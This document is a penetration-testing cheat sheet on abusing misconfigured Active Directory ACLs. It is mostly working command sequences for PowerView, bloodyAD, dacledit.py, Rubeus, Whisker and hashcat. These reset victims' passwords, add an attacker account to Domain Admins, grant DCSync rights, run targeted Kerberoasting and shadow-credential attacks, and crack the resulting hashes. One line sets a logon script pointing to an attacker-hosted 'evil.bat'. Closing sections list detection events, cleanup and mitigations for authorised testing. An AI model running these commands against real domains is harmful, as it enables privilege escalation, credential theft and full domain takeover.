# ACL and DACL Attacks

Identify and exploit misconfigured Access Control Lists to gain elevated privileges or access to sensitive objects.
ACL abuse is one of the most powerful privilege escalation techniques in AD, often overlooked by defenders.

## Quick Reference

```powershell
# PowerView - Find interesting ACLs
Find-InterestingDomainAcl -ResolveGUIDs

# Check specific user's ACLs
Get-DomainObjectAcl -Identity targetuser -ResolveGUIDs | ? {$_.SecurityIdentifier -eq $sid}

# Add user to group (GenericAll/GenericWrite)
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'attacker'
```

## Understanding ACL Abuse

### Common Abusable ACEs

| ACE Permission | Abuse Method | PowerView Function |
|----------------|--------------|-------------------|
| ForceChangePassword | Reset user password | Set-DomainUserPassword |
| AddMembers | Add to group | Add-DomainGroupMember |
| GenericAll | Full control | Set-DomainUserPassword, Add-DomainGroupMember |
| GenericWrite | Modify object | Set-DomainObject |
| WriteOwner | Take ownership | Set-DomainObjectOwner |
| WriteDACL | Modify permissions | Add-DomainObjectACL |
| AllExtendedRights | All extended rights | Set-DomainUserPassword |
| AddSelf | Add self to group | Add-DomainGroupMember |

## Enumeration

### PowerView ACL Enumeration

```powershell
# Import PowerView
Import-Module .\PowerView.ps1

# Find all interesting ACLs
Find-InterestingDomainAcl -ResolveGUIDs

# Find ACLs for specific user
$sid = Convert-NameToSid username
Get-DomainObjectAcl -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}

# Find objects where user has GenericAll
Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll" -and $_.SecurityIdentifier -match $sid}

# Find WriteDACL permissions
Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "WriteDacl"}
```

### BloodHound ACL Analysis

```powershell
# Collect data with SharpHound
.\SharpHound.exe -c All --zipfilename bloodhound_data.zip

# In BloodHound GUI, run queries:
# - Shortest Path to Domain Admins
# - Find Principals with DCSync Rights
# - Find Computers where Domain Users are Local Admin
# - Shortest Path from Owned Principals
```

### dacledit.py (Linux)

```bash
# Enumerate ACLs for user
dacledit.py -action read -principal user -target targetuser domain.local/user:password

# Enumerate ACLs on domain object
dacledit.py -action read -target-dn 'DC=domain,DC=local' domain.local/user:password
```

### Native Windows ACL Enumeration

```powershell
# Get ACL for specific user
Get-ADUser username | Get-Acl | Select-Object -ExpandProperty Access

# Get ACL for all users
foreach($line in [System.IO.File]::ReadLines("C:\users.txt")) {
    Get-Acl "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'username'}
}

# Using dsacls
dsacls.exe "CN=targetuser,CN=Users,DC=domain,DC=local"
```

## Exploitation

### ForceChangePassword

```powershell
# PowerView
$newpass = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity targetuser -AccountPassword $newpass

# Native PowerShell
$newpass = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-ADAccountPassword -Identity targetuser -NewPassword $newpass -Reset

# Linux with rpcclient
rpcclient -U domain/user%password 10.10.10.10
rpcclient $> setuserinfo2 targetuser 23 'Password123!'
```

### AddMembers (Add to Group)

```powershell
# PowerView
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'attacker'

# Verify
Get-DomainGroupMember -Identity 'Domain Admins'

# Native PowerShell
Add-ADGroupMember -Identity 'Domain Admins' -Members 'attacker'

# Linux with net rpc
net rpc group addmem "Domain Admins" attacker -U domain/user%password -S 10.10.10.10
```

### GenericAll Abuse

```powershell
# Change password
$newpass = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity targetuser -AccountPassword $newpass

# Add to group
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'targetuser'

# Set SPN for Kerberoasting
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/svc'}

# Targeted Kerberoasting
.\Rubeus.exe kerberoast /user:targetuser /nowrap
```

### GenericWrite Abuse

```powershell
# Set logon script
Set-DomainObject -Identity targetuser -Set @{scriptpath='\\attacker\share\evil.bat'}

# Disable pre-authentication for ASREP roasting
Set-DomainObject -Identity targetuser -XOR @{useraccountcontrol=4194304}

# Set SPN for Kerberoasting
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/svc'}
```

### WriteDACL Abuse

```powershell
# Grant DCSync rights to user
Add-DomainObjectAcl -TargetIdentity 'DC=domain,DC=local' -PrincipalIdentity attacker -Rights DCSync

# Grant GenericAll on user
Add-DomainObjectAcl -TargetIdentity targetuser -PrincipalIdentity attacker -Rights All

# Verify
Get-DomainObjectAcl -Identity targetuser -ResolveGUIDs | ? {$_.SecurityIdentifier -match $attackerSID}
```

### WriteOwner Abuse

```powershell
# Take ownership of object
Set-DomainObjectOwner -Identity targetuser -OwnerIdentity attacker

# Grant yourself full control
Add-DomainObjectAcl -TargetIdentity targetuser -PrincipalIdentity attacker -Rights All

# Abuse the object
Set-DomainUserPassword -Identity targetuser -AccountPassword $newpass
```

## Linux ACL Abuse

### BloodyAD

```bash
# Change password
bloodyAD.py -u user -p password -d domain.local --host 10.10.10.10 set password targetuser 'Password123!'

# Add to group
bloodyAD.py -u user -p password -d domain.local --host 10.10.10.10 add groupMember 'Domain Admins' targetuser

# Grant DCSync rights
bloodyAD.py -u user -p password -d domain.local --host 10.10.10.10 add dcsync targetuser

# Set owner
bloodyAD.py -u user -p password -d domain.local --host 10.10.10.10 set owner targetuser attacker
```

### dacledit.py

```bash
# Grant DCSync rights
dacledit.py -action write -rights DCSync -principal attacker -target-dn 'DC=domain,DC=local' domain.local/user:password

# Grant GenericAll
dacledit.py -action write -rights FullControl -principal attacker -target targetuser domain.local/user:password

# Remove ACE (cleanup)
dacledit.py -action remove -ace-sid S-1-5-21-... domain.local/user:password
```

## Targeted Kerberoasting

```bash
# Set SPN on user with GenericAll/GenericWrite
targetedKerberoast.py -v -d domain.local -u user -p password --target targetuser

# Request TGS
GetUserSPNs.py domain.local/user:password -request-user targetuser

# Crack hash
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt
```

## Shadow Credentials Attack

```powershell
# Add shadow credential (requires GenericAll/GenericWrite)
.\Whisker.exe add /target:targetuser

# Request TGT with certificate
.\Rubeus.exe asktgt /user:targetuser /certificate:cert.pfx /password:certpass /nowrap

# Use TGT
.\Rubeus.exe ptt /ticket:ticket.kirbi
```

## Notes

### ACL Attack Chains

Common privilege escalation paths:
1. **User → GenericAll on Group → Add Self → Privileged Group Member**
2. **User → WriteDACL on Domain → Grant DCSync → Dump Hashes**
3. **User → GenericWrite on User → Set SPN → Kerberoast → Crack Password**
4. **User → WriteOwner on User → Take Ownership → Grant Rights → Reset Password**

### Detection

ACL abuse generates:
- Event ID 4662 (Operation performed on object)
- Event ID 4670 (Permissions changed)
- Event ID 4728 (Member added to security-enabled global group)
- Event ID 5136 (Directory service object modified)
- Event ID 4738 (User account changed)

Monitor for:
- Unusual ACL modifications
- Unexpected group membership changes
- Password resets by non-admin users
- SPN additions to user accounts
- DCSync rights granted to non-admin accounts

### BloodHound Queries

Useful custom queries:
```cypher
// Find shortest path from owned user to Domain Admins
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}))
RETURN p

// Find users with DCSync rights
MATCH p=(u:User)-[:MemberOf|GetChanges*1..]->(d:Domain)
RETURN p

// Find computers where Domain Users are local admin
MATCH p=(g:Group {name:"DOMAIN USERS@DOMAIN.LOCAL"})-[:AdminTo]->(c:Computer)
RETURN p
```

### Common Misconfigurations

Frequently found ACL issues:
- Help Desk groups with password reset rights on all users
- Service accounts with GenericAll on Domain Admins
- Users with WriteDACL on domain object
- Exchange groups with excessive permissions
- Nested group memberships leading to unintended rights

### Privilege Escalation Paths

**Low Privilege → Domain Admin:**
1. Enumerate ACLs with PowerView/BloodHound
2. Identify path to privileged group/user
3. Abuse ACL chain (GenericAll → WriteDACL → DCSync)
4. Dump domain hashes
5. Use DA hash for full compromise

### Cleanup

Always clean up after ACL abuse:
```powershell
# Remove from group
Remove-DomainGroupMember -Identity 'Domain Admins' -Members 'attacker'

# Remove ACE
Remove-DomainObjectAcl -TargetIdentity targetuser -PrincipalIdentity attacker -Rights All

# Reset password (if changed)
Set-DomainUserPassword -Identity targetuser -AccountPassword $originalpass

# Remove SPN
Set-DomainObject -Identity targetuser -Clear serviceprincipalname
```

### Mitigation Recommendations

For clients:
- Implement least privilege for ACLs
- Regularly audit ACLs with BloodHound
- Remove unnecessary ACEs
- Use AdminSDHolder for privileged accounts
- Monitor Event IDs 4662, 4670, 5136
- Implement tiered administration model
- Use Protected Users group
- Regular ACL audits with PowerView/BloodHound
- Implement JEA (Just Enough Administration)
- Use LAPS for local admin passwords

### AdminSDHolder

Protected accounts inherit ACLs from AdminSDHolder:
- Domain Admins
- Enterprise Admins
- Schema Admins
- Administrators
- Account Operators
- Backup Operators
- Print Operators
- Server Operators
- Replicator

ACLs reset every 60 minutes by SDProp process.

### Resources

- [ACL Attack Cheatsheet](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adds-acl-ace/)
- [BloodHound Documentation](https://bloodhound.readthedocs.io/)
- [PowerView Documentation](https://powersploit.readthedocs.io/)
- [DACL Attacks HTB Academy](https://academy.hackthebox.com/course/preview/dacl-attacks-i)
